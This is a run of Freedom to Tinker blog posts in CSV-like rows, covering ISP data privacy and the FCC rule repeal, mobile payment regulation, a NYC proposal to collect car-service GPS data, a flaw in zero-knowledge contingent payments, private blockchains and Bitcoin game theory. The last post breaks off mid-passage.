"384","2017-05-08","2023-03-24","https://freedom-to-tinker.com/2017/05/08/innovation-in-network-measurement-can-and-should-affect-the-future-of-internet-privacy/","As most readers are likely aware, the Federal Communications Commission (FCC) issued a rule last fall governing how Internet service providers (ISPs) can gather and share data about consumers that was recently rolled back through the Congressional Review Act. The media stoked consumer fear with headlines such as “For Sale: Your Private Browsing History” and comments about how ISPs can now “sell your Web browsing history to advertisers“. We also saw promises from large ISPs such as Comcast promising not to do exactly that. What’s next is anyone’s guess, but technologists need not stand idly by. Technologists can and should play an important role in this discussion in several ways. In particular, conveying knowledge about the capabilities and uses of network monitoring, and developing both new monitoring technologies and privacy-preserving capabilities can and should shape this debate in three important ways: (1) Level-setting on the data collection capabilities of various parties; (2) Understanding and limiting the power of inference; and (3) Developing new monitoring technologies that help facilitate network operations and security while protecting consumer privacy. 1. Level-setting on data collection uses and capabilities. Before entering a debate about privacy, it helps to have a firm understanding of who can collect what types of data—both in theory and in practice, as well as the myriad ways that data might be used for good (and bad). For example, in practice, if anyone has your browsing history, your ISP is a less likely culprit than an online service provider such as Google—who operates a browser, and (perhaps more importantly) whose analytics scripts are on a large fraction of the Internet’s web pages. Your browsing is also likely being logged by many of the countless online trackers that keep track of your browsing history, often without your knowledge or consent. In contrast, the network monitoring technology that is available in routers and switches today makes it a lot more difficult to extract “browsing history”; that requires a technology commonly referred to as “deep packet inspection” (DPI), or complete capture of network traffic data, which is expensive to deploy, and even more costly when data storage and analysis is concerned. Most ISPs will tell you than DPI is deployed on only a small fraction of the links in their networks, and that fraction is going down as speeds are increasing; it’s expensive to collect and analyze all of that data. ISPs do, of course, collect other types of traffic statistics, such as lookups to domain names via the Domain Name System (DNS) and coarse-grained traffic volume statistics via IPFIX. That data can, of course, be revealing. At the same time, ISPs will correctly point out that monitoring DNS and IPFIX is critical to securing and operating the network. DNS traffic, for example, is central to detecting denial of service attacks or infected devices. IPFIX statistics are critical for monitoring and mitigating network congestion. DNS is a quintessential example of data that is both incredibly sensitive (because it reveals the domains and websites we visit, among other things, and is typically unencrypted) and incredibly useful for detecting attacks, ranging from phishing to denial of service attacks. The long line of security and traffic engineering research illustrates both the importance of data collection, as well as the limitations of current network monitoring capabilities in performing these tasks. Take, for example, research on botnet detection, which has shown the power of using DNS lookup data and IPFIX statistics for detecting compromise and intrusion. Or, the development of traffic engineering capabilities in the data center and in the wide area, which depend on the collection and analysis of IPFIX records and in some cases packet traces. 2. Understanding (and mitigating) the power of inference. While most of the focus in the privacy debate thus far concerns data collection (specifically, a focus on DPI, which is somewhat misguided per the discussion above), we would be wise to also consider what can be inferred from any data that is collected. For example, various aspects of “browsing history” could be evident from various datasets ranging from DNS to DPI, but as discussed above all of these datasets also have legitimate operational uses. Furthermore, “browsing history” is evident from a wide range of datasets that many parties are privy to without our consent, beyond just ISPs. Such inference capabilities are only going to increase with the proliferation of data-producing Internet-connected devices coupled with advances in machine learning. If prescriptive rules specify which some types of data can be collected, we risk over-prescribing rules, while failing to achieve the goal of protecting the higher-level information that we really want to protect. While asking questions about collection is a fine place to start a discussion, we should be at least as concerned with how the data is used, what it can be used to infer, and who it is shared with.We likely should be asking: (1) What data do we think should be protected or private? (2) What types network data permits inference of that private data? (3) Who has access to that data and under what circumstances? Suppose that I am interested in protecting information about whether I am at home. My ISP could learn this information from my traffic patterns, simply based on the decline in traffic volume from individual devices, even if all of my web traffic were encrypted, and even if I used a virtual private network (VPN) for all of my traffic. Such inference will be increasingly possible as more devices in our homes connect to the Internet. But, online service providers could also come to know the same information without my consent, based on different data; Google, for example, would know that I’m browsing the web at my office, rather than at home, through the use of technologies such as cookies, browser fingerprinting, and other online device tracking mechanisms. Past and ongoing research, such as the Web Transparency and Accountability Project, as well as the “What They Know” series from the Wall Street Journal, shed important light on what can be inferred from various digital data sources. The Upturn report last year was similarly illuminating with respect to ISP data. More recently, researchers at Princeton including Noah Apthorpe and Dillon Reisman have been developing techniques to mitigate the power of inference using various traffic shaping and camouflaging techniques to limit what an ISP can infer from traffic patterns coming from a home network. 3. Facilitating purpose-driven network measurement and data minimization. Part of the tension surrounding network measurement and privacy is that current network monitoring technology is very crude; in fact, this technology hasn’t changed considerably in nearly 30 years. It at once gathers too much data, and yet, for many purposes, it is still too little. Consider, for example, that with current network monitoring technology, an ISP (or content provider) have incredible difficulty determining a user’s quality of experience for a given application, such as video streaming, simply because the wrong kind of data is collected, at the wrong granularity. As a result, ISPs (and many other parties in the Internet ecosystem) adopt a post hoc “collect first, ask questions later” approach, simply because current network monitoring technology (1) is oriented towards offline processing on warehoused data; (2) does not make it easy to figure out what data is needed to answer a particular analysis question. Instead, network data collection could be driven by the questions operators were asking; data could be collected if—and only if—it were pertinent to a specific question or network operations task, such as monitoring application performance or detecting attacks. For example, suppose that an operator could ask a query such as “tell me the average packet loss rate of all Netflix video streams for subscribers in Seattle”. Answering such a query with today’s tools is challenging: one would have to collect all packet traces and all DNS queries and somehow identify post hoc that these streams correspond to the application of interest. In short, it’s difficult, if not impossible, answer such an operational query today without large-scale collection and storage of (very sensitive) data—all to find what is essentially a needle in a haystack. Over the past year, my Ph.D. student Arpit Gupta at Princeton has been leading the design and development of a system called Sonata that may ultimately resolve this dichotomy and give us the best of both worlds. Two emerging technologies—(1) in-band network measurement, as supported by Barefoot’s Tofino chipset; (2) scalable streaming analytics platforms such as Spark—make it possible to write a high-level query in advance and only collect the data that is needed to satisfy the query. Such technology allows a network operator to write a query in a high-level language (in this case, Scala), specifying only the question, but allowing the runtime to figure out the minimal set of raw data that is needed to satisfy the operator’s query. Our goal in the design and implementation of Sonata was to satisfy the operational and scaling limitations of network measurement, but achieving such scalability also has data minimization effects that have positive benefits for privacy. Data that is collected can also be a liability; it may, for example, become the target of law enforcement requests or subpoenas, which parties such as ISPs, but also online providers such as Google are regularly subject to. Minimizing the collected data to only that which is pertinent to operational queries can also ultimately help reduce this risk. Sonata is open source, and we welcome contributions and suggestions from the community about how we can better support specific types of network queries and tasks. Summary. Network monitoring and analytics technology is moving at a rapid pace, in terms of its capabilities to help network operators answer important questions about performance and security, without coming at the cost of consumer privacy. Technologists should devote attention to developing new technologies that can help achieve the best of both worlds, and on helping educate policymakers about the capabilities (and limitations) of existing network monitoring technology. Policymakers should be aware that network monitoring technology continues to advance, and should focus discussion around protecting what can be inferred, rather than focusing only on who can collect a packet trace."
"385","2017-04-03","2023-03-24","https://freedom-to-tinker.com/2017/04/03/dissecting-the-likely-forthcoming-repeal-of-the-fccs-privacy-rulemaking/","Last week, the House and Senate both passed a joint resolution that prevents the new privacy rules from the Federal Communications Commission (FCC) from taking effect; the rules were released by the FCC last November, and would have bound Internet Service Providers (ISPs) in the United States to a set of practices concerning the collection and sharing of data about consumers. The rules were widely heralded by consumer advocates, and several researchers in the computer science community, including myself , played a role in helping to shape aspects of the rules. I provided input into the rules that helped preserve the use of ISP traffic data for research and protocol development. How much should we be concerned? Consumers have cause for concern, but almost certainly not as much as the media would have you believe. The joint resolution is expected to be signed by the President, whereupon it will go into law. Many articles in the news last week announced the joint resolution passed by Congress as a watershed moment, saying effectively that Internet service providers can “now” sell your data to the highest bidder. Yet, the first thing to realize is that Internet service providers were never prevented from doing this, and in some sense, the Congressional repeal simply preserves the status quo, with respect to ISPs and data sharing. That is, the privacy rule that was released last November, never went into effect. That said, there is one thing that consumers might be more concerned about: The resolution also prevents the FCC from making similar rules in the future, which has the effect of removing the threat of regulatory action on privacy. Previously, even though it was legal for ISPs to share your data without your consent, they might not have done so simply for fear of regulatory action from the FCC. If this resolution becomes law, there is no longer such a threat, and we will have to rely on market forces for ISPs to be good stewards of our data. With these high-order bits in mind, the rest of this post will dissect the events over the past year or so in more detail. Who regulates privacy? Part of the complication surrounding the debates on privacy is that there are currently two agencies in our government who are primarily responsible for protecting consumer privacy. The Federal Trade Commission (FTC) operates under the FTC Act and regulates consumer protection for businesses that are not “common carriers”; this includes most businesses, with the exception of public utilities, and—recently, with the passage of the Open Internet Order (the so-called “net neutrality” rule) in 2015—ISPs. One of the landmark decisions in the Open Internet Order was to classify ISPs under “Title II” (telecommunications providers), whereas previously they were classified under Title I. This action effectively moved the jurisdiction for regulating ISP privacy from the FTC (where Google, Facebook, and other Internet companies are regulated) to the FCC. Essentially, there is a firewall of sorts between the two agencies when it comes to privacy rulemaking: The FTC is prohibited by federal law from regulating common carriers, and the FCC has a statutory mandate (under Section 222 of the telecommunications act) to protect customer data that is collected by common carriers. Are the FCC’s privacy rules “fair”? Part of the debate from the ISPs surrounds whether this separation is fair: ISPs like Comcast and online service providers (so called “edge providers” in Washington) like Google are increasingly competing in the same markets, and regulating them under different rules can in some sense create an uneven playing field. Depending on your viewpoint and orientation, there is some merit to this argument: The FCC’s privacy rules are stronger than the FTC’s rules, as the FCC’s rules govern additional information that cannot be shared without user consent, such as browsing history, application usage history, and geolocation. Companies who are regulated by the FTC (Google, Facebook, etc.) have no such restrictions on sharing your data without your consent. Whether this situation is “fair” depends in some sense on your perspective about whether edge providers like Google and ISPs like Comcast should be subject to the same rules. The ISP viewpoint (and the Republican rationale behind the resolution) of the joint resolution is that for the Googles and Facebooks of the world, your data is not considered sensitive; they can already gather this information about your browsing history and sell it to third-party marketers. The ISPs and Republicans view that if ISPs and edge providers are really in the same market (or should allowed to be), then they shouldn’t be subject to different rules. That sounds good, except there are a couple of hangups. The first is, as mentioned, the FTC cannot regulate ISPs; they are prohibited from doing so by federal law. Unless the ISPs are reclassified again under Title I, they may currently end up in a situation where nobody can legally regulate them, since the FTC is already prevented from doing so, and it is increasingly looking like the FCC will be prevented from doing so, as well. The charitable viewpoint to the situation is that the goal appears to be not to get rid of privacy rules entirely, but rather to shift everything concerning consumer privacy back to the FTC, where ISPs and edge providers are subject to the same rules. But, in the meantime, the situation may be suspended in a strange limbo. The consumer advocate viewpoint is that, in the current market for ISPs in the United States, many consumers do not have a choice of ISP. Therefore, the ISPs are in a position of power that the edge providers do not have. In many senses, that is true: in many parts of the United States, studies from the FCC and elsewhere have shown that consumers have only one choice of broadband ISP. This places the ISP in a position of great power, because we can’t just rely on “market forces” to encourage good behavior towards consumers if consumers can’t vote with their feet. Effectively, in contrast to edge providers such as Google or Facebook, in certain markets in the US, one cannot simply “opt out” of one’s ISP. There are also some arguments that ISPs can see a lot more data than edge providers can; that point is certainly arguable, given the level of instrumentation that a company like Google has on everything from the trackers they place on just about every website on the Internet to their command over our browser, mobile operating system, etc. More likely, we should be equally concerned about both edge providers and ISPs. The repeal, and the status quo. In essence, the repeal that is likely to come in the coming weeks should cause concern, but it is not quite as simple as “ISPs can now sell your data to the highest bidder”. Keep in mind that ISPs have always legally been able to do so, and they haven’t done so yet. In fact, on Friday, Comcast just committed to not selling your data to third-party marketers, which provides some hope that the market will, in fact, induce behavior that is good for consumers. In some sense, the repeal will do nothing except to preserve the status quo. Ultimately, time will tell. I do expect that increasingly ISPs may look increasingly like advertisers—after all, they have been trying to get into the business of advertising for years. Without the threat of regulatory enforcement that has existed until now, ISPs may be more likely to enter these markets (or at least try to do so). In the coming years, there may not be much we can do about this except hope that the market enforces good behavior. It should be noted that, despite the widespread attention to Virtual Private Networks as a possible defense against ISP data collection over the past week, these offer scant protection against the kinds of data that would or could be collected about you, as I and others have previously explained. Privacy is a red herring. The real problem is lack of competition. The prospect of relying on the market brings me to a final point. One of the oft-forgotten provisions of the Open Internet Order’s reclassification of the ISPs under Title II is that the FCC can compel the ISPs to “unbundle the local loop”—a technical term for letting competing ISPs share the underlying physical infrastructure. We used to have this situation in the United States (older readers probably remember the days of “mom and pop” DSL providers who leased infrastructure from the telcos), and many countries in Europe still have competitive markets by virtue of this structure. One possible path forward that could give more leverage to market forces would be to unbundle the local loop under Title II. This outcome is widely viewed to be highly unlikely. Part of the reason this might be unlikely is that if Title II reclassification is walked back and ISPs end up in the Title I regime once again. Oddly, though we are likely to hear much uproar over the “repeal” of the net neutrality rules, one silver lining will be that if and when such a rollback occurs, the ISPs will be bound by some privacy rules. If the current resolution passes, they’ll be bound by none at all. Finally, it is worth remembering that there are other uses of customer data besides selling it to advertisers. My biggest role in helping shape the FCC’s original privacy rules was to help preserve the use of this data for Internet engineers and researchers who continue to develop new algorithms and protocols to help the Internet perform better, and to keep us safe from attacks ranging from denial of service to phishing. While none of us may be excited at the prospect of having our data shared with advertisers without our consent, we all benefit from other operational uses of this data, and those uses should certainly be preserved."
"386","2017-02-01","2023-03-24","https://freedom-to-tinker.com/2017/02/01/regulatory-questions-abound-as-mobile-payments-clamor-for-position-in-apps/","People frequently associate mobile payments with “tap and pay” — walking into a store, flashing your smartphone, and then walking out with stuff. But in-store sales really aren’t the focus of companies working on mobile payment issues. That’s because payment in stores generally isn’t a problem in need of a fix. Swiping a payment card at a terminal is quick and painless. Even dipping a chip-card is getting faster. And thanks to regulation, consumers generally don’t have to consider data security tradeoffs when choosing between different ways to pay. In contrast, buying things while browsing over the Internet on our phones — in apps or via browsers — is a miserable process. It’s kind of amazing that we haven’t fixed the basic process of buying things over our phones, given how dependent we are on our phones for Internet browsing. The average iPhone user unlocks his phone 80 times a day. And the average American smartphone user spends five hours a day browsing on his phone. Yet, shopping cart conversion rates are abysmal over mobile phones. Estimates vary, but one recent study found that when consumers use their phones to shop online, they purchase items they put in their shopping carts only 1.53% of the time. Imagine being a store owner where over 98% of the people in your lines just wander off because they’re too frustrated with the process of giving you money. Analysts generally attribute the difference to the difficulty consumers have completing lengthy checkout forms, which require that they input payment credentials, billing addresses, shipping addresses and other information into a tiny screen with their thumbs. For me personally, one checkout process took me about 130 thumb taps. Last holiday season, a diverse group of companies rushed to fill that gap. In June, PayPal enabled “One Touch,” which allows consumers to stay logged into their PayPal account on specific devices and, accordingly, buy stuff with one touch. That same month Apple announced that it will be expanding Apple Pay so that consumers can use their thumbprints to purchase things in apps, as well as on the Safari browser (even when they’re surfing on a desktop). Apple also integrated payments into iMessage, making payments as casual as chatting. Not to be outdone, Facebook announced in September that it has partnered with what TechCrunch describes as “all the major players” in the payments industry to enable credit card and debit payments for Messenger’s 1 billion users. Amazon’s Echo bypasses phones entirely by allowing you to pay for things by speaking into the air. Apple followed up with its own voice-activiated payments on Siri. And oh by the way, Google Payments already gives you the option of storing and autofiling payment card credentials if you’re browsing the Internet using the Chrome browser. Safari does too. Of course, big banks aren’t giving up without a fight. JPMorgan Chase launched its own mobile wallet for in-app purchases, barely in time for Black Friday. Once a consumer downloads the app and creates a login, his pre-existing Chase cards are “automatically” enrolled in the wallet. According to Chase, that touches one out of every two American households. All of these offerings are pretty much interchangeable to consumers: they’re made to be very convenient, “frictionless” ways to pay. From a design perspective, the goal is a nearly invisible payments layer, because the aim is to minimize any disruption of the consumer’s interaction with the merchant’s website. It’s gotten to the point where some consumers are complaining that they don’t know how to slow the payments process down. On the one hand, all of these options are great for consumers. But on the other hand, there may be all kinds of differences under the hood of these payment devices that consumers won’t be able to see. A payment tool may gather, use, or share consumer data differently than what consumers expect. They may have different standards for protecting consumer data from hackers and thieves. Or, in extreme cases, they may do things that are patently illegal — for example creating phantom account for consumers and then billing them for them. (Heck, in some cases, the apps may even be from imposter companies.) Until very recently, consumers haven’t had to think about these potential differences because they’ve been living in a payments world dominated by plastic cards offered by highly-regulated banks. Take supervisory examinations, as an example. Banks are generally examined for compliance with consumer protection requirements. This means that regulators send specialized examiners to banks’ places of business to speak with employees and review their records to make sure they’re following the law. Examiners will review email and phone exchanges, to understand if consumers are given the proper disclosures. They’ll review consumer complaints to ensure that consumers are treated fairly. Because JPMorgan Chase is a bank, it’s subject to examinations. So when Chase Pay hits the market, it will have had its tires kicked (or it least can have its tires kicked) by the government. This is a good thing for consumers and also arguably the bank. But it’s also a business cost — compliance and preparing for examinations requires a significant investment of money and, perhaps more importantly, delays the bank’s ability to get a product to market. (Notably, despite being announced in 2015 and Chase’s position as the leading wholly-owned payment provider for merchants, Chase Pay is still only accepted at two major retailers.) New payment-focused fintech companies are subject to a wide variety of other regulations, but generally don’t have regulators coming on-site to examine their operations for consumer protection concerns. There are odd exceptions, but it’s far from a level playing field. For instance, companies that are very large players in the market for sending payments from the U.S. to other countries (“remittances”) are subject to examination. So if a company is a “larger participant” in remittances market and also offers retail consumer payments in smartphones, the latter could be swept up in an examination for the former. Elsewhere, companies that have contractual relationships with credit card issuers may be considered “service providers” to banks. At least one commentator, for instance, has opined that Apple’s service provider relationship with credit card-issuing banks makes Apple Pay subject to consumer protection examinations for unfair, deceptive, and abusive acts and practices. But many of the new payment services being offered to consumers won’t require the companies to have pre-existing contracts with consumers’ payment card issuers. How do browser extensions fit in the patchwork quilt of consumer protection examinations? Are messaging apps that allow for payment connectivity “third party service providers” from an examination perspective? How do you even examine for consumer disclosures when a payment is made over a speaker? There are many more unanswered questions. For instance, what responsibility — from a regulatory perspective — do app stores have for protecting consumers from imposter payment apps? Is the lack of a level playing field fair to banks? More importantly, is it fair to consumers? Do the old divisions that treat these companies differently still make sense?"
"387","2017-01-04","2023-03-24","https://freedom-to-tinker.com/2017/01/04/nyc-to-collect-gps-data-on-car-service-passengers-good-intentions-gone-awry-or-something-else/","During the holiday season, New York City through its Taxi & Limousine Commission (the “TLC”) proposed a new rule expanding data reporting obligations for car service platform companies including Uber and Lyft. If the rule is adopted, car services will now have to report the GPS coordinates of both passenger pick-up and drop-off locations to the city government. Under NY’s Freedom of Information Law, that data in bulk will also be subject to full public release. This proposal is either a classic case of good intentions gone awry or a clandestine effort to track millions of car service riders while riding roughshod over passenger privacy. The stated justification for the new rule is to combat “driver fatigue” and improve car service safety. While the goal is laudable and important, the proposed data collection does not match the purpose and makes no sense. Does anyone really think GPS data measures a driver’s hours on the job or is relevant for the calculation of a trip’s duration? If the data collection were really designed to address driver fatigue, then the relevant data would be shift length (driver start/stop times, ride durations, possibly trip origination), not pick up/drop off locations. The reporting, though, of this GPS data to the city government poses a real and serious threat to passenger privacy. The ride patterns can be mined to identify specific individuals and where they travel. In 2014, for instance, The Guardian reported that the TLC released anonymized taxi ride data that was readily reverse engineered to identify drivers. A 2015 paper shows that mobility patterns can also be used to identify gender and ethnicity. Numerous examples—from the Netflix release of subscriber film ratings that were reverse engineered to identify subscribers to the re-identification of patients from supposedly anonymous health records—show that bulk data can often be identified to specific individuals. Disturbingly, the TLC proposal only makes one innocuous reference to protecting “privacy and confidentiality” and yet includes neither any privacy safeguards against identification of individual passengers from ride patterns nor any exemption from the NY State Freedom of Information Law. If this weren’t worrisome enough for privacy, here’s the flashing red light. The TLC proposal mentions in passing that the data might be useful for “other enforcement actions.” But, the examples given for “other enforcement actions” do not map to the data being collected. For instance, the proposal says the GPS data “will facilitate investigating passenger complaints or complaints from a pedestrian or other motorist about unsafe driving, including for incidents alleged to have occurred during or between trips, by allowing TLC to determine the location of a vehicle at a particular time.” The pick-up and drop-off locations will not work for this goal. Likewise, the proposal says that “[b]y understanding when for-hire trips to and from the airports occur TLC can better target resources to ensure that passengers are picked up at the airport only by drivers authorized to do so.” This too is a strange justification to collect individual passenger records for every ride throughout the city! This goal would be satisfied much more effectively by seeking aggregate drop-off data for the particular areas of concern to the TLC. This vague enforcement language and the mismatch between the proposal and the articulated goals strongly suggests that the rule may be a smokescreen for a new mass surveillance program of individuals traveling within New York City. Only two years ago, the NY Police Department was caught deploying a controversial program to track cars throughout the city using EZ Pass readers on traffic lights. This proposed new rule looks like a surreptitious expansion of that program to car service passengers. The TLC rule, if adopted, would provide a surveillance data trove that makes an end run around judicial oversight, subpoenas, and warrants. It’s time to put the brakes on the city’s collection of trip location data for car service rides."
"388","2017-06-08","2023-03-24","https://freedom-to-tinker.com/2017/06/08/breaking-fixing-and-extending-zero-knowledge-contingent-payments/","The problem of fair exchange arises often in business transactions — especially when those transactions are conducted anonymously over the internet. Alice would like to buy a widget from Bob, but there’s a circular problem: Alice refuses to pay Bob until she receives the widget whereas Bob refuses to send Alice the widget until he receives payment. In a previous post, we described the fair-exchange problem and solutions for buying physical goods using Bitcoin. Today is the first of two posts in which we focus on purchasing digital goods and services. In a new paper together with researchers from City University of New York and IMDEA Software Institute, Madrid, we show that Zero-knowledge contingent payments (ZKCP), a well known protocol for the fair exchange of digital goods over the blockchain is insecure in its current form. We show how to fix ZKCP, and also extend it to a new class of problems. To illustrate the problem, consider Alice, an avid fan of brainteasers who is stumped on a Sudoku puzzle. After days of trying to figure out the solution, she gives up and posts the puzzle on an online message board proclaiming, ”I will pay whoever provides me the solution to this puzzle”. Bob sees the message, finds the solution, and would like to sell it to Alice. We focus on the class of problems for which the buyer can write a program to verify the authenticity of the digital good they wish to purchase. In the Sudoku example, even though Alice does not know the solution to the puzzle, she can still write a program that verifies the solution as this only requires knowing the rules of Sudoku. In 2011, Greg Maxwell introduced what would later become known as Zero-Knowledge Contingent Payments, a protocol for trustless fair exchange of this class of problems. We won’t go into the full details of the protocol in this post, but the important part for our purposes is that the seller must provide the buyer with a zero-knowledge proof showing that he has a correct solution. When Maxwell first proposed ZKCP in 2011 it was only theoretical as there was no known efficient general purpose zero-knowledge protocol that could be used to generate the necessary proofs. Since then, however, advances have been made in this area, and there are now general-purpose Succinct Non-Interactive Arguments of Knowledge (ZK-SNARK) that allow for the practical implementation of the necessary proofs. Maxwell therefore refined his protocol to use SNARKs, and Sean Bowe provided a proof-of-concept implementation for the Sudoku problem. Bowe and Maxwell demonstrated the implementation at the 2016 Financial Cryptography Conference. We show, however, that the current SNARK-based instantiation of ZKCP is insecure. SNARKs require a trusted setup, which is often problematic in practice. Addressing this issue, Maxwell notes: The GGPR’12 cryptosystem requires a trusted setup, but for the ZKCP application this is no real limitation since the buyer can perform it. [source] At first glance, this reasoning seems sound. If the buyer performs the trusted setup, we know that the seller cannot cheat and produce false proofs. But as we will show, there is a flaw with this reasoning. ZKCP using SNARKs as shown in the FC’16 demo slides. pk, and vk are the trusted parameters that are generated by the Alice, the buyer. [source] A zero-knowledge proof system has two main properties that need to be preserved: soundness and zero-knowledge. The soundness property states that the prover cannot generate false proofs that convince the buyer of something untrue. The zero-knowledge property states that the proof leaks no information about the inputs other than the statement that is being proven. In SNARKs, the trusted setup is required to achieve both of these properties. If a malicious party generated the trusted parameters, there is no guarantee that the proof system is either sound or zero-knowledge. Let’s now consider our Sudoku problem once more. Recall that each party wants to make sure that it doesn’t get cheated by the other party. Thus, when considering who the adversary is in the above protocol, it really depends on whose view we consider. To Alice, a malicious Bob is the adversary as he may try to have Alice pay him even though he does not know a solution to the Sudoku. To Bob, however, a malicious Alice is the adversary as she may try to learn the Sudoku solution (or any part of it) without paying Bob. A fair exchange protocol must protect against both of these potential adversaries, and indeed these adversaries each map to one of the two properties of zero-knowledge proofs. The soundness property ensures that Bob cannot falsely convince Alice that learning the he has the correct solution to her problem. The zero-knowledge property ensures that Alice can learn nothing about the solution from the proof that Bob provides. The importance of these two properties to this double-adversarial model is exactly why the buyer cannot perform the trusted setup. While this guarantees that the seller cannot create false proofs, it allows a malicious buyer to generate the trusted parameters in a special way that allows her to break the zero-knowledge property. Alice, in our Sudoku example, can set up the system in a way that Bob’s proof leaks information about the solution. Thus she can learn part of the solution without paying for it, and this is clearly not a fair-exchange. In the paper, we show concrete attacks that allow Alice to learn information about the solution to demonstrate that the zero-knowledge property is broken. We also provide code that implements a malicious buyer in the sudoku example. Our code interacts with Bowe and Maxwell’s unmodified seller code and allows the buyer to learn part of the Sudoku solution without paying. Maxwell’s initial proposal of ZKCP is not broken; what is broken is the SNARK-based instantiation that trusts the buyer to perform the setup. We show a few mitigations in the paper of how one can regain the zero-knowledge property and perform secure zero-knowledge contingent payments. In a follow-up post, we will demonstrate a second contribution of our paper: how we extend ZKCP to a new class of problems that were not realizable by the original protocol."
"389","2015-09-18","2023-03-24","https://freedom-to-tinker.com/2015/09/18/private-blockchain-is-just-a-confusing-name-for-a-shared-database/","Banks and financial institutions seem to be all over the blockchain. It seems they agree with the Bitcoin community that the technology behind Bitcoin can provide an efficient platform for settlement and for issuing digital assets. Curiously, though, they seem to shy away from Bitcoin itself. Instead, they want something they have more control over and doesn’t require exposing transactions publicly. Besides, Bitcoin has too much of an association in the media with theft, crime, and smut — no place for serious, upstanding bankers. As a result, the buzz in the financial industry is about “private blockchains.” But here’s the thing — “private blockchain” is just a confusing name for a shared database. The key to Bitcoin’s security (and success) is its decentralization which comes from its innovative use of proof-of-work mining. However, if you have a blockchain where only a few companies are allowed to participate, proof-of-work doesn’t make sense any more. You’re left with a system where a set of identified (rather than pseudonymous) parties maintain a shared ledger, keeping tabs on each other so that no single party controls the database. What is it about a blockchain that makes this any better than using a regular replicated database? Supporters argue that the blockchain’s crypto, including signatures and hash pointers, is what distinguishes a private blockchain from a vanilla shared database. The crypto makes the system harder to tamper with and easier to audit. But these aspects of the blockchain weren’t Bitcoin’s innovation! In fact, Satoshi tweaked them only slightly from the earlier research that he cites in his whitepaper — research by Haber and Stornetta going all the way back to 1991! Here’s my take on what’s going on: It is true that adding signatures and hash pointers makes a shared database a bit more secure. However, it’s qualitatively different from the level of security, irreversibility, and censorship-resistance you get with the public blockchain. The use of these crypto techniques for building a tamper-resistant database has been known for 25 years. At first there wasn’t much impetus for Wall Street to pay attention, but gradually there has arisen a great opportunity in moving some types of financial infrastructure to an automated, cryptographically secured model. For banks to go this route, they must learn about the technology, get everyone to the same table, and develop and deploy a standard. The blockchain conveniently solves these problems due to the hype around it. In my view, it’s not the novelty of blockchain technology but rather its mindshare that has gotten Wall Street to converge on it, driven by the fear of missing out. It’s acted as a focal point for standardization. To build these private blockchains, banks start with the Bitcoin Core code and rip out all the parts they don’t need. It’s a bit like hammering in a thumb tack, but if a hammer is readily available and no one’s told you that thumb tacks can be pushed in by hand, there’s nothing particularly wrong with it. Thanks to participants at the Bitcoin Pacifica gathering for helping me think through this question."
"390","2015-05-21","2023-03-24","https://freedom-to-tinker.com/2015/05/21/the-story-behind-the-picture-of-nick-szabo-with-other-bitcoin-researchers-and-developers/","Reddit seems to have discovered this picture of a group of 20 Bitcoin people having dinner, and the community seems intrigued by Nick Szabo’s public presence. It’s actually an old picture, from March 2014. I was the chief instigator of that event, so let me tell the story of how that amazing group of people happened to be assembled at Princeton’s Prospect House. Photo credit: Matt Green It started with an innocuous email from Matt Green to me pointing out that there were Bitcoin research groups in the DC/Baltimore area, Princeton, and Cornell, and that since Princeton was centrally located, it would be nice to get some folks in a room there for a day to toss around some ideas. I was immediately excited, but wanted to expand the group a little bit while still keeping it small enough to fit around a (large) table. In particular, I felt that Bitcoin developers and academic researchers had important things to say to each other, but had few chances to get together. So the workshop had to include devs. I was also interested in having people like Zooko Wilcox-O’Hearn and Nick Szabo — I couldn’t have cared less if Szabo was Satoshi or not, but he seemed to have interesting things to say about cryptocurrencies. With help from Ed Felten, Andrew Miller, and Joe Bonneau, I emailed a few people, and things sort of magically came together at short notice. (A big part of the “magic” is CITP’s competence at organizing events like these). We settled on a one-day private workshop followed by a one-day public conference, a formula that’s since been used successfully for various other CITP events. Unlike the workshop, the point of the conference is not to say novel things but to inform the public; you can watch the video recordings here. The workshop was immensely high-energy and fun, and was based on free-form round-table and breakout discussions instead of talks — a workshop as workshops should be. Everyone who was there seems to remember it fondly. We got a lot done in a day. For the Princeton group, it convinced us that we understood the science behind Bitcoin well enough that we should teach it. Later that summer, we taped our MOOC which is now free to the public, and has since expanded into a textbook-in-progress as well. Since the photo already has the Twitter handles of the participants, here they are in more convenient clickable form (clockwise, starting from Matt Green who took the picture): Matt Green Ittay Eyal Zooko Wilcox-O’Hearn Andrew Miller Nick Szabo Peter Todd Greg Maxwell Arvind Narayanan Sarah Meikeljohn Emin Gün Sirer Rainer Böhme Joe Bonneau Sergio Demian Lerner Gavin Andresen Steven Goldfeder Ed Felten Josh Kroll Nicolas Christin Ian Miers Christina Garman Jeremy Clark"
"391","2015-04-17","2023-03-24","https://freedom-to-tinker.com/2015/04/17/bitcoin-is-a-game-within-a-game/","In this series on Bitcoin and game theory, I’ve argued that Bitcoin’s stability is fundamentally a game-theoretic proposition and shown how we’ve had blind spots for years in our theoretical understanding of mining strategy. In this post, I’ll get to the question of the discrepancy between theory and practice. As I pointed out, even though there are many theoretical weaknesses in Bitcoin’s consensus mechanism, none of these ever appear to have been exploited. A blunt way to explain the discrepancy is to entirely reject the ability of game-theoretic models to predict practice. For example, some people argue that since miners don’t know any game theory, game-theoretic analysis of their behavior is not meaningful. This objection is easily dismissed — animals know even less game theory than miners, and yet their behavior is one of the classic applications of game theory. And most pairs of prisoners facing a dilemma have never heard the term prisoner’s dilemma. Knowledge of game theory by agents is not a prerequisite for the applicability of game theory. A related objection is that deviating from the default strategy is hard, from the miners’ point of view. After all, it’s not as if Bitcoin Core comes with deviant strategies built in that can be enabled with the flip of a command-line switch. What’s a miner to do? While superficially plausible, I think this objection gets the cause and effect exactly backwards. In reality, no one’s bothered to implement non-default strategies because they didn’t think there were profits to be made from it. Otherwise there would likely be a flourishing ecosystem of patches — or replacements — to bitcoind that would execute these deviant strategies, just as we see with mods to video games. A more sophisticated objection, and perhaps the most frequent one, is that it’s not in miners’ interest to employ non-default strategies, because it will cause people to lose confidence in Bitcoin’s stability, tanking the price of bitcoins. A drop in the exchange rate is bad for miners it will devalue their investment in mining hardware. This is a valid argument, but things get tricky. We do know that miners launch denial-of-service attacks against their competitors; does a similar worry about Bitcoin’s stability and the exchange rate not apply? Besides, it seems that even though it’s phrased as an objection to game-theoretic reasoning, the argument actually co-opts game theory: essentially, it says that non-default strategies are a losing move because they will be met by a certain response from other players, namely investors selling off their bitcoins. Similarly, consider the argument that attacks on consensus won’t work because developers will notice and push out an update that defeats it. This is also a game-theoretic argument; the set of participants has now expanded to include developers, and perhaps people running Bitcoin nodes, in addition to miners and investors (an investor being anyone who’s holding bitcoins). So we have one kind of game-theoretic argument — 